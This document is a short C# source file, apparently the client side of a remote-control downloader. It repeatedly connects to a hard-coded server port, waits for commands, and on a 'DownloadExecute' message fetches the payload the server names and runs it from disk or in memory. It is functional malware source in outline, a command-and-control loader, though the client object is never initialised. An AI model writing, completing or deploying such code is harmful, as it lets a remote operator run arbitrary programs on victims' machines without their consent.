using SharpCore;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;

namespace Client
{
    class Program
    {
        static SharpClient client;

        const string host = "127.0.0.1";
        const ushort port = 1337;

        static void Main(string[] args)
        {
            // loop while running
            while (true)
            {
                Console.WriteLine("Attempting to connect to server");
                client.Connect(host, port);

                // loop while connected
                while (client.Connected)
                {
                    // recieve a message
                    string message = client.ReceiveMessage();

                    // process a message (possibly on another thread?)
                    ProcessMessage(message);
                }
            }
        }

        static void ProcessMessage(string message)
        {
            // cast the first char of the string to a byte and then to a custom type
            SharpMessageType packetType = (SharpMessageType)(byte)message[0];

            // cast the second char of the string to a byte and then to another custom type
            SharpImageType imageType = (SharpImageType)(byte)message[1];

            // the rest is raw string (actual message)
            string raw = new string(message.Skip(2).ToArray());

            // handle the incoming message with simple logic
            if (packetType == SharpMessageType.DownloadExecute)
            {
                if (imageType != SharpImageType.net)
                {
                    Computer.DownloadExecuteLocally(raw);
                }
                else
                {
                    Computer.DownloadExecuteMemory(raw);
                }
            }

            // send a response to the server that we got the message
            client.SendMessage(new string((char)SharpMessageType.OKServer, (char)SharpImageType.none));
        }


    }
}
